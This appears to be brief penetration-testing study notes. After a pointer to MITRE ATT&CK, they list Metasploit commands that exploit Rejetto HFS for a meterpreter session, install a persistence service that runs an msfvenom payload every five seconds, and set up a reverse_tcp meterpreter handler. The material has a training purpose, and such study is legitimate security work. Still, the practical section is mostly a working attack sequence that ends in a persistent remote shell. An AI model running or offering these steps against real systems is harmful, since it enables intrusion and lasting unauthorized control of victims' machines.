## Mitre ATT&CK
* `https://attack.mitre.org`
* It is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.

* PRACTICAL
* Exploit with :
* `use exploit/windows/http/rejetto_hfs_exec`
* This will give a meterpreter session
* `search persistence_service`
* `use exploit/windows/local/persistence_service`
* This will generate a payload with MSF venom.
* Set lport to a free port.
* Set session id to that of the meterpreter, after uploading it to the system it will create a new persistence service.
* After every five seconds, the persistent service will execute the payload, which will then try to connect to the handler that we will set up.
* **Setup the handler**
* `use exploit/multi/handler`
* `set payload windows/meterpreter/reverse_tcp`

***
* Establishing persistence on a system does interfere with the functionality of the operating system.
* You require elevated privileges in order to establish persistence on a Windows system.
